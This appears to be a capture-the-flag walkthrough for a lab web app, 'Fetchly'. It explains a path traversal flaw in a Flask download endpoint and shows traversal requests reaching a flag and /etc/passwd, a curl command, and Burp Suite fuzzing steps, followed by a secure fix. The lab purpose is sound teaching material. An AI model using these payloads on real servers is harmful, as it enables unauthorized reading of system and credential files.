# Fetchly — Solution / Walkthrough

> ⚠️ **Spoilers ahead.** Try the challenge yourself before reading.

## The vulnerability

`src/fetchly/app.py` builds the file path like this:

```python
target_path = os.path.join(STORAGE_DIR, doc)   # doc comes from the user
...
return send_file(target_path, as_attachment=False)
```

`os.path.join` resolves `..` components, and the code never checks that the
final path stays inside `STORAGE_DIR`. That is a textbook path traversal
(CWE-22): the `doc` parameter can walk *up* out of the intended directory.

## Exploitation

Normal, intended request:

```
GET /documents/download?doc=welcome.txt
```

Escape the `storage/` directory to read the flag one level up:

```
GET /documents/download?doc=../flag.txt
```

With `curl`:

```bash
curl --path-as-is "http://localhost:5000/documents/download?doc=../flag.txt"
```

> `--path-as-is` stops curl from normalizing `../` before sending.

Expected output:

```
FLAG{fetchly_p4th_tr4v3rs4l_l3v3l_1}
```

### Going further

Because there is no filtering at all, you can keep walking up and read files
from the container filesystem, e.g.:

```
GET /documents/download?doc=../../../../etc/passwd
```

(Inside the hardened container this reads the container's own `/etc/passwd`,
not your host's — which is the point of running labs in Docker.)

## Doing it in Burp Suite

1. Proxy your browser through Burp and load <http://localhost:5000>.
2. Click **Download** on any document — capture the request in **Proxy > HTTP history**.
3. Send it to **Repeater**.
4. Change the `doc` parameter to `../flag.txt` and send.
5. Observe the flag in the response.

Try fuzzing the parameter with **Intruder** using a path-traversal wordlist
(e.g. from [SecLists](https://github.com/danielmiessler/SecLists)) to see how a
scanner would find this automatically.

## The fix

The correct implementation resolves the path and verifies it stays within the
allowed base directory before serving:

```python
import os
from flask import abort, send_file

def safe_path(base_dir: str, user_supplied: str) -> str:
    # Reject absolute paths and resolve the real, canonical path.
    full = os.path.realpath(os.path.join(base_dir, user_supplied))
    base = os.path.realpath(base_dir)
    # Ensure the resolved path is inside base_dir.
    if os.path.commonpath([full, base]) != base:
        abort(403)
    return full
```

Other defenses: serve files by an opaque ID mapped server-side (never by raw
filename), use an allow-list, or use a framework helper such as Flask's
`send_from_directory`, which performs safe-join checks for you.
